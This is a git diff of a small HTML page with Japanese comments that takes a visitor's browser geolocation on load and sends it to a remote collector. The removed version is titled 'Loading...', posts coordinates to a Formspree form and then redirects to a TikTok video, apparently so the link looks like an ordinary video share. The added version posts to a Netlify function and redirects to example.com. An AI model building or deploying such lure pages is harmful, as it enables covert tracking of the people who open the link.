@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Location Sender</title>
     <script>
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, redirectNow);
+                navigator.geolocation.getCurrentPosition(sendLocation);
             } else {
-                // 位置情報取得に失敗した場合もリダイレクト
-                redirectNow();
+                alert("位置情報を取得できません。");
             }
         }
 
@@ -18,24 +17,26 @@
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
 
-            // ここで位置情報を送信する処理
-            fetch("https://formspree.io/f/xanedrka", {
-                method: "POST",
-                headers: { 
-                    "Content-Type": "application/x-www-form-urlencoded" 
-                },
-                body: `lat=${lat}&lon=${lon}`
-            }).finally(redirectNow);
+            // Netlify FunctionにPOSTリクエストを送信
+            fetch('/.netlify/functions/send-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ lat: lat, lon: lon }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data.message);
+                window.location.replace("https://example.com");  // リダイレクト
+            })
+            .catch(error => {
+                console.error("Error:", error);
+            });
         }
 
-        function redirectNow() {
-            // 位置情報の有無に関係なくリダイレクト
-            window.location.replace("https://www.tiktok.com/@kaga1024/video/7431843644312800513");
-        }
-
-        getLocation();
+        window.onload = getLocation;
     </script>
 </head>
 <body>
+    <h1>位置情報を送信しています...</h1>
 </body>
 </html>
